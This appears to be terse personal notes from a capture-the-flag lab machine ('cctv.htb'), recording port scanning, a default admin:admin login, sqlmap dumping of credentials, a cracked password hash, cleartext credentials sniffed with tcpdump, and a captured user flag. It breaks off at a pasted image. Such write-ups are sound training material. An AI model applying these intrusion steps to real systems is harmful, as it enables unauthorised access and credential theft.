network enumeration:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZ15GCLPzC4gTM0nqzpUbr/2L77bM1C9sbBecivQPX/KcKvJrP88peCJXwTug7T/EORHr7M7JeHtMQJ6hYihFA=
80/tcp open  http    syn-ack Apache httpd 2.4.58
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

hell no i just type admin:admin i get dashboard and found v1.37.63 

then found the cve and other resource then:

if do sqlmap and found username and password:

after hashcat

```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```

  
CCTV stack uses containerized services communicating internally.

capturing all traffic :

```
tcpdump -i any -nn 

port 5000 is hit frequently so :

mark@cctv:~$ tcpdump -i any -nn -A tcp port 5000

E..g.!@.@..(.......
.>.. 'Cs.. .....X......
u&%.....USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
10:11:16.616594 vethf19addd P   IP 172.25.0.10.5000 > 172.25.0.11.35646: Flags [.], ack 52, win 509, options [nop,nop,TS val 784641 ecr 1965434325], length 0
E..4..@.@.
```


then login into it:

```
sa_mark@cctv:~$ ls
'SecureVision Staff Announcement.pdf'   user.txt
sa_mark@cctv:~$ cat user.txt
3622bd6d84732dfc96801149725b5714
```


the pdf have info :

![[Pasted image 20260308161542.png]]

